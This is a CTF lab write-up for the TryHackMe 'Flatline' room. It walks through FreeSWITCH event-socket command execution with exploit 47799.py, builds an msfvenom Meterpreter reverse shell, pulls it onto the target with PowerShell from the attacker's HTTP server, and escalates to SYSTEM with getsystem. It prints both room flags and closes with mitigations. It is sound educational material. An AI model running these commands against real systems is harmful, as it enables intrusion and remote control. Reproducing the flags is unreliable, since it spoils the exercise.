# 🪟 TryHackMe — Flatline

![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-success?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Windows%20%7C%20RCE%20%7C%20Privilege%20Escalation-blue?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Completed-success?style=for-the-badge)

> **Room:** Flatline  
> **Platform:** TryHackMe  
> **Focus:** Network Enumeration, FreeSWITCH, Remote Command Execution, Windows Enumeration, Meterpreter, Privilege Escalation

---

# 📌 Overview

The **Flatline** room demonstrates a Windows compromise through an exposed **FreeSWITCH mod_event_socket** service.

The attack begins with network enumeration, where port **8021** is identified as FreeSWITCH. A public command-execution exploit (`47799.py`) is then used against the service to execute commands remotely.

The initial command execution allows the attacker to enumerate the Windows system and retrieve the **user flag**. However, the **root flag** cannot be read directly through the command-execution primitive.

To obtain a more capable shell, a Windows Meterpreter payload is generated with `msfvenom`, transferred to the target using PowerShell, and executed through the vulnerable FreeSWITCH service. A Metasploit handler receives the Meterpreter session.

The Meterpreter session initially runs as the `Nekrotic` user. The built-in `getsystem` command then successfully obtains a **SYSTEM** session through Named Pipe Impersonation, allowing the root flag to be read.

---

# 🎯 Objectives

- Enumerate the target machine.
- Identify the exposed FreeSWITCH service.
- Identify the vulnerable service and exploit it.
- Obtain remote command execution.
- Enumerate the Windows filesystem.
- Capture the user flag.
- Generate a Windows Meterpreter payload.
- Transfer and execute the payload.
- Obtain a Meterpreter session.
- Escalate from `Nekrotic` to `NT AUTHORITY\SYSTEM`.
- Capture the root flag.

---

# 🖥️ Target Information

Target IP used in the screenshots:

```text
10.49.163.58
```

> **Note:** TryHackMe target IPs change between sessions. Replace `<TARGET_IP>` with the IP assigned to you.

Attacker/Kali IP used in the screenshots:

```text
192.168.132.194
```

Replace it with your own Kali IP where required:

```text
<KALI_IP>
```

---

# 🔗 Attack Path

```text
Nmap Enumeration
       ↓
Port 8021 — FreeSWITCH mod_event_socket
       ↓
FreeSWITCH Command Execution
       ↓
47799.py
       ↓
Remote Command Execution
       ↓
Windows Enumeration
       ↓
Read user.txt
       ↓
Root.txt access denied
       ↓
Generate Meterpreter Payload
       ↓
Transfer shell.exe to Target
       ↓
Execute shell.exe
       ↓
Meterpreter Session
       ↓
Nekrotic
       ↓
getsystem
       ↓
NT AUTHORITY\SYSTEM
       ↓
Read root.txt
```

---

# 1. 🔎 Initial Nmap Enumeration

The first step was to identify the open ports and services running on the target.

### Command

```bash
nmap -sV -Pn <TARGET_IP>
```

### Screenshot

![Nmap Enumeration](images/1.png)

The scan identified two important open ports:

| Port | Service | Description |
|---|---|---|
| 3389 | ms-wbt-server | Microsoft Terminal Services / RDP |
| 8021 | freeswitch-event | FreeSWITCH `mod_event_socket` |

The target was identified as a Windows machine.

The most interesting service was port **8021**, because it exposed the FreeSWITCH event socket remotely.

Since no credentials were available for RDP, the investigation focused on port 8021.

---

# 2. 🔍 Investigating FreeSWITCH

The service discovered on port 8021 was:

```text
FreeSWITCH mod_event_socket
```

FreeSWITCH's event socket provides an interface for sending commands to the FreeSWITCH service.

Searching for known vulnerabilities revealed a command-execution exploit for FreeSWITCH 1.10.1, commonly distributed as `47799.txt`.

The exploit is a Python script and can be used to execute commands on a vulnerable FreeSWITCH instance.

For a local Kali installation, the exploit can be obtained through Exploit-DB/SearchSploit:

```bash
searchsploit FreeSWITCH
```

The relevant entry is:

```text
FreeSWITCH 1.10.1 - Command Execution
```

The exploit can then be copied locally:

```bash
searchsploit -m 47799
```

If the downloaded file is named `47799.txt`, it can be renamed:

```bash
mv 47799.txt 47799.py
```

---

# 3. ⚡ Testing Remote Command Execution

The exploit was used to execute a Windows `dir` command against the target.

### Command

```bash
python3 47799.py <TARGET_IP> 'dir'
```

### Screenshot

![FreeSWITCH RCE](images/2.png)

The response showed:

```text
Authenticated
```

followed by the contents of:

```text
C:\Program Files\FreeSWITCH
```

The directory contained FreeSWITCH components such as:

```text
FreeSwitch.dll
FreeSwitchConsole.exe
fs_cli.exe
htdocs
mod
conf
log
```

This confirmed that arbitrary Windows commands could be executed remotely through the vulnerable FreeSWITCH service.

---

# 4. 📁 Enumerating `C:\Users`

After confirming command execution, the next step was to enumerate the Windows users.

### Command

```bash
python3 47799.py <TARGET_IP> 'dir C:\Users'
```

### Screenshot

![Users Enumeration](images/3.png)

The output showed:

```text
Administrator
Nekrotic
Public
```

The user account:

```text
Nekrotic
```

was particularly interesting because the user's Desktop contained the flags.

---

# 5. 👤 Enumerating the `Nekrotic` Profile

The `Nekrotic` user's home directory was examined.

### Command

```bash
python3 47799.py <TARGET_IP> 'dir C:\Users\Nekrotic'
```

### Screenshot

![Nekrotic Directory](images/4.png)

The directory contained the standard Windows profile folders:

```text
Desktop
Documents
Downloads
Favorites
Links
Music
Pictures
Saved Games
Searches
Videos
```

The next location of interest was:

```text
C:\Users\Nekrotic\Desktop
```

---

# 6. 🚩 Finding the Flags

The Desktop directory was enumerated.

### Command

```bash
python3 47799.py <TARGET_IP> 'dir C:\Users\Nekrotic\Desktop'
```

### Screenshot

![Desktop Enumeration](images/5.png)

The directory contained:

```text
root.txt
user.txt
```

Both flags were present, but they did not necessarily have the same access permissions.

---

# 7. 🧑‍💻 Capturing the User Flag

The `user.txt` file was read using the Windows `type` command.

### Command

```bash
python3 47799.py <TARGET_IP> 'type C:\Users\Nekrotic\Desktop\user.txt'
```

### Screenshot

![User Flag](images/6.png)

The user flag was:

```text
THM{64bca0843d535fa73eecd59d27cbe26}
```

### User Flag

```text
THM{64bca0843d535fa73eecd59d27cbe26}
```

---

# 8. 🔒 Attempting to Read `root.txt`

The same technique was used against the root flag.

### Command

```bash
python3 47799.py <TARGET_IP> 'type C:\Users\Nekrotic\Desktop\root.txt'
```

### Screenshot

![Root Flag Access Attempt](images/7.png)

The response was:

```text
ERR no reply
```

The root flag could not be retrieved using the current command-execution method.

This indicated that a more capable shell and/or higher privileges were required.

---

# 9. 🧬 Generating a Meterpreter Payload

To obtain an interactive Meterpreter session, a Windows x64 reverse TCP executable was generated with `msfvenom`.

### Command

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=<KALI_IP> \
LPORT=443 \
-f exe > shell.exe
```

### Screenshot

![Payload Generation](images/8.png)

The payload generated was:

```text
shell.exe
```

The output showed a final executable size of approximately 7680 bytes.

---

# 10. 📤 Transferring `shell.exe` to the Target

A Python HTTP server can be started from the directory containing `shell.exe`:

```bash
python3 -m http.server 8000
```

The target was then instructed to download the payload using PowerShell.

### Command

```bash
python3 47799.py <TARGET_IP> 'powershell Invoke-WebRequest -URI http://<KALI_IP>:8000/shell.exe -o C:\Users\Nekrotic\Desktop\shell.exe'
```

### Screenshot

![Payload Transfer](images/9.png)

The exploit returned:

```text
ERR no reply
```

However, the next directory listing confirmed that the file had been transferred successfully.

The Desktop listing showed:

```text
shell.exe
```

with a size of:

```text
7680 bytes
```

This confirmed that the payload was present on the target.

---

# 11. 🎧 Starting the Metasploit Handler

A Metasploit multi/handler was configured to receive the Meterpreter connection.

### Commands

```text
use /multi/handler
set LHOST <KALI_IP>
set LPORT 443
set payload windows/x64/meterpreter/reverse_tcp
run
```

### Screenshot

![Metasploit Handler](images/10.png)

The handler started listening on:

```text
<KALI_IP>:443
```

The configured payload was:

```text
windows/x64/meterpreter/reverse_tcp
```

---

# 12. 🚀 Executing the Payload

The uploaded `shell.exe` was executed through the same FreeSWITCH command-execution vulnerability.

### Command

```bash
python3 47799.py <TARGET_IP> 'C:\Users\Nekrotic\Desktop\shell.exe'
```

### Screenshot

![Payload Execution](images/10-1.png)

The exploit authenticated successfully.

Once the payload connected back to the waiting Metasploit handler, a Meterpreter session was established.

---

# 13. 🪪 Checking the Meterpreter User

The first step after receiving the Meterpreter session was to determine the current user.

### Command

```text
getuid
```

### Screenshot

![Meterpreter getuid](images/11.png)

The result was:

```text
Server username: WIN-EOM4PK0578N\Nekrotic
```

Therefore, the Meterpreter session was running as:

```text
Nekrotic
```

This confirmed that the reverse shell had successfully moved from simple command execution to an interactive Meterpreter session.

---

# 14. 👑 Privilege Escalation with `getsystem`

The next step was to attempt privilege escalation.

Meterpreter provides the `getsystem` command for attempting to elevate privileges on Windows.

### Command

```text
getsystem
```

### Screenshot

![Meterpreter getsystem](images/12.png)

The result was:

```text
got system via technique 1 (Named Pipe Impersonation (In Memory/Admin))
```

The current identity was then checked again:

```text
getuid
```

The result was:

```text
Server username: NT AUTHORITY\SYSTEM
```

The privilege escalation was successful.

The session had moved from:

```text
WIN-EOM4PK0578N\Nekrotic
```

to:

```text
NT AUTHORITY\SYSTEM
```

---

# 15. 🗂️ Navigating the Windows Filesystem

After obtaining SYSTEM privileges, the current directory was checked.

### Commands

```text
pwd
cd ..
cd ..
ls
```

### Screenshot

![Filesystem Enumeration](images/13.png)

The current location was initially:

```text
C:\Program Files\FreeSWITCH
```

The filesystem was then navigated back to:

```text
C:\
```

The root of the filesystem contained directories including:

```text
Program Files
ProgramData
Users
Windows
```

The `Users` directory was then selected.

---

# 16. 📂 Navigating to `Nekrotic`

The following commands were used:

```text
cd Users
ls
```

### Screenshot

![Users Directory](images/14.png)

The `Nekrotic` user directory was present.

The session then navigated into it:

```text
cd Nekrotic
ls
```

### Screenshot

![Nekrotic Directory](images/15.png)

The user's profile contained the Desktop directory.

The session then moved into:

```text
C:\Users\Nekrotic\Desktop
```

---

# 17. 👑 Capturing the Root Flag

The Desktop directory was listed after obtaining SYSTEM privileges.

### Command

```text
cd Desktop
ls
```

### Screenshot

![Root Flag](images/16.png)

The Desktop contained:

```text
desktop.ini
root.txt
shell.exe
user.txt
```

The root flag was then read:

```text
cat root.txt
```

The flag was:

```text
THM{8c8bc5558f0f3f8060d00ca231a9fb5e}
```

### Root Flag

```text
THM{8c8bc5558f0f3f8060d00ca231a9fb5e}
```

---

# 🚩 Flags

## User Flag

```text
THM{64bca0843d535fa73eecd59d27cbe26}
```

## Root Flag

```text
THM{8c8bc5558f0f3f8060d00ca231a9fb5e}
```

---

# 🔗 Complete Attack Chain

```text
                    TARGET
                      │
                      ▼
               Nmap Enumeration
                      │
                      ▼
        8021/tcp — FreeSWITCH Event Socket
                      │
                      ▼
             Search for Exploit
                      │
                      ▼
                  47799.py
                      │
                      ▼
          FreeSWITCH Command Execution
                      │
                      ▼
            Windows Enumeration
                      │
                      ▼
          C:\Users\Nekrotic\Desktop
                      │
               ┌──────┴──────┐
               ▼             ▼
           user.txt       root.txt
               │             │
               ▼             ▼
           User Flag      Access Denied
                              │
                              ▼
                   Generate shell.exe
                              │
                              ▼
                    Transfer via PowerShell
                              │
                              ▼
                     Execute shell.exe
                              │
                              ▼
                     Meterpreter Session
                              │
                              ▼
                           Nekrotic
                              │
                              ▼
                         getsystem
                              │
                              ▼
                    NT AUTHORITY\SYSTEM
                              │
                              ▼
                          root.txt
                              │
                              ▼
                         Root Flag
```

---

# 📊 Attack Chain Summary

| Stage | Technique | Result |
|---|---|---|
| 1 | Nmap Enumeration | Discovered ports 3389 and 8021 |
| 2 | Service Enumeration | Identified FreeSWITCH |
| 3 | Exploit Research | Found FreeSWITCH command execution exploit |
| 4 | RCE | Executed Windows commands remotely |
| 5 | Windows Enumeration | Found `Nekrotic` user |
| 6 | File Enumeration | Located `user.txt` and `root.txt` |
| 7 | Flag Capture | Retrieved user flag |
| 8 | Privilege Limitation | `root.txt` could not be read initially |
| 9 | Payload Generation | Created Meterpreter `shell.exe` |
| 10 | File Transfer | Downloaded payload to target |
| 11 | Payload Execution | Obtained Meterpreter session |
| 12 | User Enumeration | Confirmed `Nekrotic` |
| 13 | Privilege Escalation | `getsystem` obtained SYSTEM |
| 14 | Filesystem Enumeration | Navigated to Desktop |
| 15 | Root Flag | Retrieved `root.txt` |

---

# 🧠 Key Takeaways

### 1. Enumerate unusual services

Port 8021 was more interesting than the initially obvious RDP port.

The service:

```text
FreeSWITCH mod_event_socket
```

provided the entry point into the machine.

---

### 2. Service version information can lead directly to exploitation

Once FreeSWITCH was identified, exploit research revealed a command-execution vulnerability affecting FreeSWITCH 1.10.1.

The `47799.py` exploit allowed commands to be sent to the service remotely.

---

### 3. RCE does not always mean you immediately have a full shell

The initial exploit provided command execution, but reading `root.txt` directly was unsuccessful.

A more interactive payload was therefore generated and executed to obtain a Meterpreter session.

---

### 4. Windows command execution can be chained with PowerShell

The vulnerable FreeSWITCH service was used to execute:

```text
powershell Invoke-WebRequest ...
```

This allowed the Meterpreter executable to be transferred onto the target.

---

### 5. Always check the current security context

After receiving the Meterpreter session:

```text
getuid
```

showed:

```text
WIN-EOM4PK0578N\Nekrotic
```

This confirmed that the session was not yet running as SYSTEM.

---

### 6. `getsystem` successfully elevated privileges

The Meterpreter command:

```text
getsystem
```

successfully used:

```text
Named Pipe Impersonation (In Memory/Admin)
```

to obtain:

```text
NT AUTHORITY\SYSTEM
```

This provided full administrative access to the Windows machine.

---

# 🛡️ Mitigation Recommendations

## Secure FreeSWITCH

- Change default FreeSWITCH credentials.
- Do not expose `mod_event_socket` directly to untrusted networks.
- Restrict access to port 8021 using firewall rules.
- Configure allowed IP ranges appropriately.
- Keep FreeSWITCH updated.
- Disable unnecessary remote management interfaces.

---

## Secure Windows Services

- Keep Windows and installed applications patched.
- Remove unnecessary exposed services.
- Restrict RDP access to trusted networks.
- Apply least-privilege permissions to service accounts.
- Monitor unusual process creation and outbound connections.

---

## Prevent Privilege Escalation

- Apply the principle of least privilege.
- Restrict dangerous token privileges where possible.
- Keep endpoint security protections enabled.
- Monitor for suspicious named-pipe activity.
- Ensure privileged services cannot be abused by low-privileged users.

---

# 🧰 Tools Used

```text
Nmap
SearchSploit
Python
47799.py
msfvenom
Metasploit Framework
Meterpreter
PowerShell
```

---

# 🎯 Skills Demonstrated

- Network Enumeration
- Service Enumeration
- Windows Enumeration
- FreeSWITCH Enumeration
- Exploit Research
- Remote Command Execution
- Windows Command Execution
- PowerShell
- Payload Generation
- Reverse Shells
- Meterpreter
- Privilege Escalation
- Windows SYSTEM Access
- Post-Exploitation
- Flag Enumeration

---

# 📸 Screenshot Directory

Place the extracted screenshots in an `images` directory beside this README:

```text
Flatline/
│
├── README.md
│
└── images/
    ├── 1.png
    ├── 2.png
    ├── 3.png
    ├── 4.png
    ├── 5.png
    ├── 6.png
    ├── 7.png
    ├── 8.png
    ├── 9.png
    ├── 10.png
    ├── 10-1.png
    ├── 11.png
    ├── 12.png
    ├── 13.png
    ├── 14.png
    ├── 15.png
    └── 16.png
```

---

# ⚠️ Disclaimer

This write-up is intended for **educational and authorized security testing purposes only**.

All exploitation techniques demonstrated here were performed against the intentionally vulnerable **TryHackMe Flatline** lab environment.

Do not use these techniques against systems or services without explicit authorization.

---

# 🏁 Conclusion

The **Flatline** room demonstrated a straightforward but effective Windows attack chain.

The initial Nmap scan revealed an exposed FreeSWITCH event socket on port 8021. After identifying the service, the `47799.py` command-execution exploit was used to obtain remote Windows command execution.

The target was then enumerated using commands such as:

```text
dir
```

which revealed the `Nekrotic` user and the Desktop containing both flags.

The user flag was retrieved directly, while the root flag could not initially be accessed. To obtain a more capable session, a Windows x64 Meterpreter payload was generated with `msfvenom`, transferred to the target using PowerShell, and executed through the existing RCE.

The resulting Meterpreter session initially ran as:

```text
WIN-EOM4PK0578N\Nekrotic
```

The `getsystem` command successfully elevated the session to:

```text
NT AUTHORITY\SYSTEM
```

After obtaining SYSTEM privileges, the `root.txt` file could be read successfully.

The complete compromise can therefore be summarized as:

```text
FreeSWITCH Exposure
        ↓
Command Execution
        ↓
Windows Enumeration
        ↓
User Flag
        ↓
Meterpreter Payload
        ↓
Meterpreter Session
        ↓
Nekrotic
        ↓
getsystem
        ↓
NT AUTHORITY\SYSTEM
        ↓
Root Flag
```
